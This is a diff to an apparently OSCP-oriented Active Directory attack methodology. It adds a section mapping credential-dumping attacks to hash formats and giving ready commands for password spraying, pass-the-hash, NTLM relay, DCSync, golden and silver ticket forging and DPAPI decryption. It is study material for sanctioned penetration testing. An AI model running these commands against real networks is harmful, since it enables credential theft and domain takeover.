@@ -10,9 +10,10 @@ A chronological methodology for attacking AD environments on the OSCP exam and l
 3. [Finding the Inputs (DN, Domain, DC, etc.)](#finding-the-inputs-dn-domain-dc-etc)
 4. [BloodHound — Setup, Collection, Queries](#bloodhound--setup-collection-queries)
 5. [Common OSCP Attack Paths](#common-oscp-attack-paths)
-6. [Lateral Movement Cheatsheet](#lateral-movement-cheatsheet)
-7. [Post-Exploitation — Dumping Secrets](#post-exploitation--dumping-secrets)
-8. [Quick Reference — "I got a cred, now what?"](#quick-reference--i-got-a-cred-now-what)
+6. [Loot → What You Can Do With It](#loot--what-you-can-do-with-it)
+7. [Lateral Movement Cheatsheet](#lateral-movement-cheatsheet)
+8. [Post-Exploitation — Dumping Secrets](#post-exploitation--dumping-secrets)
+9. [Quick Reference — "I got a cred, now what?"](#quick-reference--i-got-a-cred-now-what)
 
 ---
 
@@ -573,6 +574,225 @@ nxc smb <RANGE> -u <user> -p <pass>                    # try domain
 nxc smb <RANGE> -u <user> -p <pass> --local-auth       # try as local
 nxc smb <RANGE> -u userlist.txt -p <pass>              # spray same pw across users
 ```
+
+---
+
+## Loot → What You Can Do With It
+
+When an attack dumps a credential, you need to immediately know **what kind of credential it is**, **whether it's usable as-is or needs cracking**, and **which tools accept that format**. Reference this every time loot drops.
+
+### Attack → What It Yields
+
+| Attack | What you get | Format / hashcat mode | Reusable as-is? |
+|---|---|---|---|
+| **AS-REP Roast** | Encrypted TGT for a user with `DONT_REQ_PREAUTH` | `$krb5asrep$23$...` — mode **18200** | No — crack offline → plaintext password |
+| **Kerberoast** | Encrypted TGS for a service account | `$krb5tgs$23$...` — mode **13100** | No — crack offline → plaintext password |
+| **Responder (LLMNR/NBT-NS)** | Net-NTLMv2 challenge/response | `user::DOMAIN:challenge:hash:blob` — mode **5600** | **No** for impacket/PtH — must crack OR relay |
+| **Responder (NTLMv1 downgrade)** | Net-NTLMv1 | mode **5500** — crack fast via crack.sh | Crack only |
+| **GPP cpassword** (Groups.xml in SYSVOL) | **Plaintext** (AES-decryptable, key is public) | n/a — `gpp-decrypt` returns cleartext | **Yes** — full creds |
+| **LSASS dump** (Mimikatz `sekurlsa::logonpasswords`) | Often plaintext + NTLM + Kerberos keys | Plaintext / NTLM / AES256 | **Yes** — all formats |
+| **SAM dump** (local, `reg save HKLM\SAM`) | Local NTLM hashes (incl. local Administrator) | `aad3b...:31d6c...` — mode **1000** | **Yes** for PtH against local accounts |
+| **LSA secrets dump** | Service account creds, autologon passwords | Often plaintext or DPAPI-protected | Usually **yes** |
+| **DCSync** (`secretsdump -just-dc`) | Every domain user's NTLM + Kerberos keys (incl. `krbtgt`) | NTLM mode **1000**, AES256 mode **n/a** | **Yes** — PtH, overpass-the-hash, forge tickets |
+| **NTDS.dit + SYSTEM (offline)** | Same as DCSync | Same | Same |
+| **DPAPI master key + blob** | User-protected secrets (browser cookies, RDP creds, Wi-Fi pw, vaults) | Plaintext after decrypt | Yes after `dpapi::masterkey` + `dpapi::cred` |
+| **LAPS read** (`ms-Mcs-AdmPwd`) | **Plaintext** local Administrator on that host | n/a | **Yes** — PtH not needed |
+| **ADCS ESC1 (certipy auth)** | TGT + NTLM hash of impersonated user | NTLM + ccache | **Yes** — both PtH and Kerberos |
+| **Cached domain creds** (DCC2, last 10 logons) | One-way DCC2 hash | mode **2100** | No — crack only (no PtH possible) |
+| **KeePass DB** (.kdbx) | Master password hash | mode **13400** | Crack → opens DB → all stored creds |
+| **SSH private key** (passphrase-protected) | Passphrase hash | mode **22921** | Crack → use key directly |
+
+### Loot Type → What You Can Do With It
+
+This is the lookup table to memorize.
+
+#### 1. **Plaintext password**
+
+The most useful form. Try it on **everything**.
+
+```bash
+# Spray it across the domain (same user, all hosts)
+nxc smb <RANGE> -u USER -p 'PASS' --continue-on-success
+nxc winrm <RANGE> -u USER -p 'PASS'
+nxc mssql <RANGE> -u USER -p 'PASS'
+nxc rdp <RANGE> -u USER -p 'PASS'
+nxc ldap <RANGE> -u USER -p 'PASS'
+
+# Spray as local creds (not domain)
+nxc smb <RANGE> -u USER -p 'PASS' --local-auth
+
+# Get a TGT (Kerberos auth from Kali)
+impacket-getTGT corp.local/USER:'PASS'
+export KRB5CCNAME=USER.ccache
+impacket-wmiexec -k -no-pass corp.local/USER@host.corp.local
+
+# Re-roast as this user (often sees different SPNs / preauth-disabled users)
+impacket-GetUserSPNs corp.local/USER:'PASS' -dc-ip <DC> -request
+impacket-GetNPUsers  corp.local/USER:'PASS' -dc-ip <DC> -request -format hashcat
+
+# Re-run BloodHound as this user (sees ACLs the previous user couldn't)
+bloodhound-python -u USER -p 'PASS' -d corp.local -ns <DC> -c All --zip
+```
+
+#### 2. **NTLM hash** (`aad3b...:31d6c...` or just the NT half)
+
+Almost as useful as plaintext for **modern Windows** (NTLMv1 deprecated). NT hash is the right half (32 hex chars).
+
+```bash
+# Pass-the-Hash everywhere
+nxc smb     <IP> -u USER -H <NTHASH>
+nxc winrm   <IP> -u USER -H <NTHASH>
+evil-winrm  -i <IP> -u USER -H <NTHASH>
+impacket-psexec  corp.local/USER@<IP> -hashes :<NTHASH>
+impacket-wmiexec corp.local/USER@<IP> -hashes :<NTHASH>
+impacket-smbexec corp.local/USER@<IP> -hashes :<NTHASH>
+smbclient //<IP>/SHARE -U USER --pw-nt-hash <NTHASH>
+xfreerdp /v:<IP> /u:USER /pth:<NTHASH>   # RDP Restricted Admin only
+
+# Overpass-the-Hash → get a real Kerberos TGT from NTLM
+impacket-getTGT corp.local/USER -hashes :<NTHASH>
+export KRB5CCNAME=USER.ccache
+impacket-wmiexec -k -no-pass corp.local/USER@host.corp.local
+
+# If you also have DCSync rights → dump the whole domain
+impacket-secretsdump -just-dc corp.local/USER@<DC> -hashes :<NTHASH>
+
+# Last resort: crack to plaintext (for password reuse on services that need it)
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r best64.rule
+```
+
+**Critical:** if NT hash = `31d6cfe0d16ae931b73c59d7e0c089c0`, the account has a **blank password**. Try it.
+
+#### 3. **AES256 / AES128 Kerberos key**
+
+Same use as NTLM but for Kerberos auth (modern domains may disable RC4 → NTLM PtH breaks but AES still works).
+
+```bash
+impacket-getTGT corp.local/USER -aesKey <AES256_KEY>
+impacket-wmiexec -k -no-pass corp.local/USER@host.corp.local
+impacket-secretsdump corp.local/USER@<DC> -aesKey <AES256_KEY>
+```
+
+#### 4. **Net-NTLMv2** (Responder capture)
+
+**Cannot be passed.** Two options only:
+
+```bash
+# A. Crack offline
+hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt -r best64.rule
+
+# B. Relay to a DIFFERENT target where SMB signing is OFF
+# (you can't relay back to the host that authenticated to you)
+nxc smb <RANGE> --gen-relay-list relay-targets.txt    # find signing=off
+impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks
+# Trigger auth (mitm6, PetitPotam, printerbug) → SOCKS session as the relayed user
+```
+
+#### 5. **Net-NTLMv1** (downgrade attack)
+
+Cracks **fast** at crack.sh (DES brute), then convert to NT hash → PtH.
+
+```bash
+# Force NTLMv1 via Responder: edit /etc/responder/Responder.conf → Challenge = 1122334455667788
+sudo responder -I <iface> --lm
+# Submit hash at https://crack.sh → returns NT hash within hours
+```
+
+#### 6. **TGT (Ticket Granting Ticket)** — `.ccache` (impacket) or `.kirbi` (Rubeus/mimikatz)
+
+Authenticates as the user to **any** service in the domain until expiry (default 10h).
+
+```bash
+# Use directly from Kali
+export KRB5CCNAME=/path/to/ticket.ccache
+impacket-wmiexec  -k -no-pass corp.local/USER@host.corp.local
+impacket-secretsdump -k -no-pass corp.local/USER@dc01.corp.local
+impacket-smbclient -k -no-pass corp.local/USER@host.corp.local
+
+# Convert formats
+impacket-ticketConverter ticket.kirbi ticket.ccache
+impacket-ticketConverter ticket.ccache ticket.kirbi
+
+# Inject .kirbi into current Windows session (Mimikatz)
+kerberos::ptt ticket.kirbi
+klist                                # verify
+dir \\dc01.corp.local\C$             # use it (hostname, not IP!)
+```
+
+**Always use hostnames, not IPs, when working with Kerberos tickets** — IPs force NTLM fallback and the ticket won't be used.
+
+#### 7. **TGS (Service Ticket)** — `.kirbi` / `.ccache`
+
+Like a TGT but scoped to **one service** (cifs/host, http/host, mssql/host).
+
+```bash
+kerberos::ptt /path/to/cifs-fileserver.kirbi
+ls \\fileserver\share                # works only for the SPN in the ticket
+```
+
+#### 8. **krbtgt NTLM hash** → Golden Ticket
+
+Once you DCSync, the `krbtgt` account's hash lets you **forge TGTs as anyone, with any group membership, for up to 10 years**. Persistence.
+
+```bash
+# Impacket (offline, doesn't need a session)
+impacket-ticketer -nthash <KRBTGT_NT> -domain-sid S-1-5-21-... \
+  -domain corp.local Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-wmiexec -k -no-pass corp.local/Administrator@dc01.corp.local
+
+# Mimikatz (Windows side)
+kerberos::golden /user:Administrator /domain:corp.local \
+  /sid:S-1-5-21-... /krbtgt:<KRBTGT_NT> /ptt
+```
+
+#### 9. **Service account NTLM** + **domain SID** + **target SPN** → Silver Ticket
+
+Forge a TGS for **one service on one host**. Quieter than Golden (no DC contact during use).
+
+```bash
+impacket-ticketer -nthash <SVC_NT> -domain-sid S-1-5-21-... \
+  -domain corp.local -spn cifs/fileserver.corp.local Administrator
+
+# Mimikatz
+kerberos::golden /user:Administrator /domain:corp.local \
+  /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs \
+  /rc4:<SVC_NT> /ptt
+```
+
+#### 10. **DPAPI master key + protected blob**
+
+Decrypts user-context secrets (saved RDP creds, Chrome cookies/passwords, Wi-Fi, Credential Manager).
+
+```bash
+# On Windows with Mimikatz, user logged in
+sekurlsa::dpapi                     # extracts master keys from LSASS
+dpapi::cred /in:C:\Users\u\AppData\Local\Microsoft\Credentials\<GUID>
+
+# Offline
+impacket-dpapi masterkey -file <MASTERKEY_FILE> -sid <USER_SID> -password '<PASS>'
+impacket-dpapi credential -file <CRED_BLOB> -key <DECRYPTED_MASTERKEY>
+```
+
+#### 11. **Certificate (.pfx)** from ADCS
+
+Authenticates as the subject — returns TGT + NT hash.
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip <DC>
+# Output: NT hash of Administrator + Administrator.ccache
+```
+
+### The Mental Flow
+
+Every time a credential drops, ask in order:
+
+1. **What format is it?** (table above)
+2. **Can I use it as-is, or must I crack it?**
+3. **If usable: PtH, Kerberos auth, or both?**
+4. **Does it have rights I didn't have before?** Re-run BH with this identity marked owned, look at outbound edges.
+5. **Can I escalate to DCSync from here?** (Direct DA, GenericAll on DA group, GenericWrite on DC computer, etc.)
+6. **Is it reused?** Spray on every other user/host before assuming it's scoped.
 
 ---
 
